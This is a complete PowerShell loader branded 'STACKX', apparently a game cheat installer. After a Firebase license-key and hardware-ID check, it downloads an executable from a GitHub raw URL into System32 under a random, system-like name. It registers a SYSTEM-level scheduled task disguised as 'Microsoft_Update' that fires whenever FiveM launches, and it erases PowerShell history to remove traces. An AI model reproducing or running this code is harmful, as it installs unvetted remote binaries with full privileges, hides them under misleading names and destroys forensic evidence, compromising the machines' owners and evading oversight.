$ErrorActionPreference = "SilentlyContinue"
[Console]::Title = "STACKX | SECURE AUTHENTICATION SYSTEM"

# บังคับการถอดรหัสพื้นฐานเพื่อความปลอดภัยของคอนโซล
[Console]::OutputEncoding = [System.Text.Encoding]::ASCII

# --- [ STACKX CONFIGURATION ] ---
$DbUrl = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"

# --- [ SYSTEM FUNCTIONS ] ---
function Get-HWID {
    return (Get-CimInstance Win32_ComputerSystemProduct).UUID
}

function Show-Header {
    Clear-Host
    Write-Host ""
    Write-Host "    ███████╗████████╗ █████╗  ██████╗██╗  ██╗██╗  ██╗" -ForegroundColor Magenta
    Write-Host "    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║╚██╗██╔╝" -ForegroundColor Magenta
    Write-Host "    ███████╗   ██║   ███████║██║     ███████║ ╚███╔╝ " -ForegroundColor Magenta
    Write-Host "    ╚════██║   ██║   ██╔══██║██║     ██╔══██║ ██╔██╗ " -ForegroundColor DarkMagenta
    Write-Host "    ███████║   ██║   ██║  ██║╚██████╗██║  ██║██╔╝ ██╗" -ForegroundColor DarkMagenta
    Write-Host "    ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝" -ForegroundColor DarkMagenta
    Write-Host "   ┌─────────────────────────────────────────────────────┐" -ForegroundColor DarkGray
    Write-Host "    [ STATUS: ONLINE ]          [ AUTH SERVICE V2.0 ]   " -ForegroundColor White
    Write-Host "   └─────────────────────────────────────────────────────┘" -ForegroundColor DarkGray
    Write-Host ""
}

function Write-Console {
    param (
        [string]$Message,
        [string]$Type = "INFO"
    )
    
    switch ($Type) {
        "INFO"    { Write-Host "  [⚡] " -NoNewline -ForegroundColor DarkGray; Write-Host $Message -ForegroundColor White }
        "SUCCESS" { Write-Host "  [✔] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -ForegroundColor Green }
        "ERROR"   { Write-Host "  [✘] " -NoNewline -ForegroundColor Red; Write-Host $Message -ForegroundColor Red }
        "INPUT"   { Write-Host "  [▶] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -NoNewline -ForegroundColor Cyan }
    }
}

# --- [ MAIN INITIALIZATION ] ---
Show-Header

Write-Console "Initializing secure connection..." "INFO"
Start-Sleep -Milliseconds 600

Write-Console "Enter your STACKX License Key: " "INPUT"
$key = $Host.UI.ReadLine()

if ([string]::IsNullOrWhiteSpace($key)) {
    Write-Host ""
    Write-Console "Authentication Aborted: License key cannot be empty." "ERROR"
    Start-Sleep 3 ; exit
}

$myHwid = Get-HWID

Write-Host ""
Write-Console "Authenticating with STACKX Servers..." "INFO"
Start-Sleep -Milliseconds 400

# --- [ VERIFICATION PROCESS ] ---
try {
    $data = Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Get

    if ($null -eq $data) {
        Write-Console "Authentication Failed: License key does not exist." "ERROR"
        Start-Sleep 3 ; exit
    }

    if ($data.status -ne "active") {
        Write-Console "Authentication Failed: License is expired or revoked." "ERROR"
        Start-Sleep 3 ; exit
    }

    if ([string]::IsNullOrEmpty($data.hwid)) {
        Write-Console "Binding hardware signature to STACKX Network..." "INFO"
        $payload = @{ hwid = $myHwid } | ConvertTo-Json
        Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
        Write-Console "Hardware bound successfully." "SUCCESS"
    } 
    elseif ($data.hwid -ne $myHwid) {
        Write-Console "Security Alert: Hardware ID mismatch detected." "ERROR"
        Write-Console "This license is strictly locked to another machine." "INFO"
        Start-Sleep 3 ; exit
    }

    # --- [ LOGIN SUCCESS ] ---
    Write-Host ""
    Write-Console "ACCESS GRANTED. Welcome to STACKX." "SUCCESS"
    Write-Host ""
    Write-Host "  Press any key to load dashboard..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

} catch {
    Write-Console "Network Error: Could not reach STACKX Authentication Servers." "ERROR"
    Write-Console $_.Exception.Message "INFO"
    Start-Sleep 3 ; exit
}
# -------------------------

# --- [ ORIGINAL CODE START ] ---
$p_rand = @("font","drv","host","win","svc") | Get-Random
$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$fileName = "$p_rand$m_rand`_$r_rand.exe"
$taskName = "Microsoft_Update_$r_rand"
$destPath = "C:\Windows\System32\$fileName"
$destPathh = "STACKX"
$exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhostt.exe"

while ($true) {
    Show-Header
    
    Write-Host "  ┌──[ MAIN CONTROL INTERFACE ]─────────────────────────┐" -ForegroundColor DarkGray
    Write-Host "   (1) Install & Persistence Environment" -ForegroundColor White
    Write-Host "   (2) Check Core Status & Environment" -ForegroundColor White
    Write-Host "   (0) Secure Exit & Clear Footprints" -ForegroundColor DarkGray
    Write-Host "  └─────────────────────────────────────────────────────┘" -ForegroundColor DarkGray
    Write-Host ""
    
    Write-Console "Select Option: " "INPUT"
    $choice = $Host.UI.ReadLine()

    if ($choice -eq "1") {
        Clear-Host
        Show-Header
        Write-Host "  ┌──[ DEPLOYMENT PROCESS ]─────────────────────────────┐" -ForegroundColor Cyan
        Write-Host "   Status: Installing Core System Component...          " -ForegroundColor White
        Write-Host "  └─────────────────────────────────────────────────────┘" -ForegroundColor Cyan
        Write-Host ""

        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
            Unblock-File -Path $destPath

            auditpol /set /subcategory:"Process Creation" /success:enable
            $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe']]"
            schtasks /create /tn "$taskName" /tr "$destPath" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f

            Write-Host ""
            Write-Console "Deployment completed successfully!" "SUCCESS"
            Write-Console "STACKX will execute automatically when FiveM initializes." "INFO"
            
            Clear-History
            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host ""
            Write-Console "Installation failed!" "ERROR"
            Write-Console $_.Exception.Message "INFO"
        }
        Write-Host ""
        Write-Host "  Press any key to return to main menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Show-Header
        
        Write-Host "  ┌──[ ENVIRONMENT MONITOR ]────────────────────────────┐" -ForegroundColor Magenta
        Write-Host "   Scanning local environment configuration...          " -ForegroundColor White
        Write-Host "  └─────────────────────────────────────────────────────┘" -ForegroundColor Magenta
        Write-Host ""
        
        if (Test-Path $destPath) {
            Write-Host "  [+] System Status : " -NoNewline -ForegroundColor DarkGray; Write-Host "READY / OPERATIONAL" -ForegroundColor Green
            Write-Host "  [*] Loaded File   : " -NoNewline -ForegroundColor DarkGray; Write-Host $fileName -ForegroundColor White
            Write-Host "  [*] Active Task   : " -NoNewline -ForegroundColor DarkGray; Write-Host $taskName -ForegroundColor White
            Write-Host "  [*] Core Path     : " -NoNewline -ForegroundColor DarkGray; Write-Host $destPathh -ForegroundColor Yellow
        } else {
            Write-Host "  [-] System Status : " -NoNewline -ForegroundColor DarkGray; Write-Host "NOT INSTALLED / INACTIVE" -ForegroundColor Red
            Write-Host "  [*] Notice        : " -NoNewline -ForegroundColor DarkGray; Write-Host "Please execute option [1] to establish persistence." -ForegroundColor White
        }
        Write-Host ""
        Write-Host "  Press any key to return to main menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "0") {
        $p = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        
        if (Test-Path $p) { 
            Clear-Content $p -Force 
        }
        
        $parentDir = Split-Path $p
        if (-not (Test-Path $parentDir)) { 
            New-Item -ItemType Directory -Path $parentDir -Force | Out-Null 
        }
        
        New-Item -ItemType File -Path $p -Force | Out-Null
        exit
    }
}
